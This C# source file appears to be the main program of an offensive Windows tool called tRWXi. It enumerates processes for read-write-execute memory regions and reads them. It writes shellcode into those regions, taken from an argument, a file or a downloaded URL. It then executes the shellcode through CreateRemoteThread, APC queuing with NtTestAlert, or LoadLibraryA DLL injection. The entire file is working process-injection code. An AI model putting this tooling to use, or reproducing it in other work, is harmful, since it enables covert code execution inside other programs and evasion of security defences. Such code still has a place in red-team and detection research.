using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using tRWXi.Data;
using static tRWXi.Data.Unmanaged;
using System.Linq;
using tRWXi.Utils;
using System.Text;

namespace tRWXi
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                Dictionary<string, string> parameters = Utils.ArgParser.parse(args); 

                PROCESSENTRY32 pe = new PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(pe);

                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();

                IntPtr lpAddress = IntPtr.Zero;

                IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

                bool hResult = Process32First(hSnapshot, ref pe);

                Dictionary<int, List<Data.ProcessMemoryInfo>> processes = new Dictionary<int, List<ProcessMemoryInfo>>();

                IntPtr numberOfBytesWritten = IntPtr.Zero;

                if (parameters.ContainsKey("enumerate"))
                {
                    Console.WriteLine("[!] Started enumeration");

                    while (hResult)
                    {
                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);

                        while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                        {
                            lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                            if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
                            {
                                if (!processes.ContainsKey((int)pe.th32ProcessID))
                                {
                                    processes[(int)pe.th32ProcessID] = new List<ProcessMemoryInfo>();
                                }
                                processes[(int)pe.th32ProcessID].Add(new ProcessMemoryInfo((int)pe.th32ProcessID, pe.szExeFile, hProcess, mbi.BaseAddress, mbi.RegionSize));
                            }
                        }
                        CloseHandle(hProcess);
                        hResult = Process32Next(hSnapshot, ref pe);
                        lpAddress = IntPtr.Zero;
                    }
                }
                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("read") || parameters.ContainsKey("trigger"))
                {
                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                    {
                        int pid = Convert.ToInt32(parameters["pid"]);
                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                        IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));

                        if (parameters.ContainsKey("read"))
                        {
                            int size = Convert.ToInt32(parameters["size"]);
                            byte[] output = new byte[size];
                            IntPtr written = new IntPtr();
                            ReadProcessMemory(hProcess, addr, output, size, out written);
                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
                            Environment.Exit(0);
                        }
                        else if (parameters.ContainsKey("inject"))
                        {
                            byte[] data;
                            if (parameters.ContainsKey("data"))
                            {
                                data = Utils.Shellcoder.convert(parameters["data"]);
                            }
                            else if (parameters.ContainsKey("url"))
                            {
                                data = Utils.Shellcoder.fetch(parameters["url"]);
                            }
                            else if (parameters.ContainsKey("file"))
                            {
                                data = Utils.Shellcoder.convert(System.IO.File.ReadAllText(parameters["file"]));
                            }
                            else if (parameters.ContainsKey("dll"))
                            {
                                data = Encoding.Default.GetBytes(parameters["dll"]); 
                            }
                            else
                            {
                                data = new byte[] { };
                            }
                            Console.WriteLine("[!] Started injection");
                            WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                        }
                        else {}

                        if (parameters.ContainsKey("execute") || parameters.ContainsKey("trigger"))
                        {
                            IntPtr res = IntPtr.Zero;
                            Console.WriteLine("[!] Starting execution...");
                            if (parameters.ContainsKey("method"))
                            {
                                if (parameters["method"].Equals(Methods.APCTestAlert.ToString()))
                                {
                                    IntPtr testAlertAddr = GetProcAddress(GetModuleHandle("ntdll"), "NtTestAlert");
                                    Console.WriteLine("[*] Method {0} applied", Methods.APCTestAlert.ToString());
                                    List<IntPtr> hThreads = Helper.getThreads(pid);
                                    foreach(IntPtr thread in hThreads)
                                    {
                                        res = QueueUserAPC(addr, thread, IntPtr.Zero);
                                        if (res != IntPtr.Zero)
                                        {
                                            Console.WriteLine("[+] QueueUserAPC succeeded");
                                            break;
                                        }
                                    }
                                    var testAlert = Marshal.GetDelegateForFunctionPointer<testAlert>(testAlertAddr);
                                    testAlert();
                                }
                                else if (parameters["method"].Equals(Methods.DLL.ToString()))
                                {
                                    Console.WriteLine("[*] Method {0} applied", Methods.DLL.ToString());
                                    IntPtr llw = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
                                    res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, llw, addr, 0, IntPtr.Zero);
                                }
                            }
                            else
                            {
                                res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                            }

                            if (res != IntPtr.Zero)
                            {
                                Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                            }
                        }
                    }
                    else
                    {
                        Utils.Helper.help();
                        Environment.Exit(1);
                    }
                }
                else
                {
                    Utils.Helper.help();
                    Environment.Exit(1);
                }
                
                CloseHandle(hSnapshot);

                if (parameters.ContainsKey("enumerate"))
                {
                    foreach (KeyValuePair<int, List<ProcessMemoryInfo>> kv in processes)
                    {
                        string pName = kv.Value.First().processName;
                        Console.WriteLine(String.Format("[+] {0} -> {1}: ", kv.Key, pName));
                        foreach (ProcessMemoryInfo pmi in kv.Value)
                        {
                            Console.WriteLine(String.Format("\thandler::{0}\tbaseAddress:0x{1:X}\tsize::{3}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.baseAddress, pmi.size));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                Environment.Exit(1);
            }
        }
    }
}
